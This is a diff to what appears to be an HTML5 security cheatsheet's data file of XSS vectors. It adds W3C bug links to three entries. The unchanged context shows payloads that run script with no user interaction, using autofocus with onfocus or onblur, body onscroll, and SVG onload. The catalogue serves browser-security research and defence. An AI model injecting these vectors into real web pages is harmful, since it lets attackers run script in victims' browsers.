@@ -101,7 +101,7 @@ var items =
         'name'       : 'Self-executing focus event via autofocus',
         'data'       : '<input onfocus=%js_write% autofocus>',
         'description': 'This vector uses an input element with autofocus to call its own focus event handler - no user interaction required',
-        'tickets'    : [],
+        'tickets'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602'],
         'howtofix'   : '',            
         'browsers'   : {
             'opera': [
@@ -120,7 +120,7 @@ var items =
         'name'       : 'Self-executing blur event via autofocus competition',
         'data'       : '<input onblur=%js_write% autofocus><input autofocus>',
         'description': 'Here we have two HTML input elements competing for the focus - and one executing JavaScript on losing its focus',
-        'tickets'    : [],
+        'tickets'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602'],
         'howtofix'   : '',            
         'browsers'   : {
             'opera': [
@@ -165,7 +165,7 @@ var items =
         'tags'       : ['xss', 'poster', 'video', 'opera', 'html5'],
         'reporter'   : '.mario'
     },
-    { /* ID 11 - SVG executing JavaScript via G tag and onload attribute  */
+    { /* ID 11 - SVG executing JavaScript via <G> tag and onload attribute  */
         'id'         : 11, 
         'category'   : 'svg', 
         'name'       : 'SVG executing JavaScript via <G> tag and onload attribute',
@@ -193,7 +193,7 @@ var items =
         'name'       : 'Self-executing JavaScript via <BODY> onscroll autofocus',
         'data'       : '<body onscroll=%js_write%><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
         'description': 'This vector triggers an onscroll event executing JavaScript on <BODY> due to an autofocus on an <INPUT> way further down the page.',
-        'tickets'    : [],
+        'tickets'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602'],
         'howtofix'   : '',            
         'browsers'   : {
             'opera': [
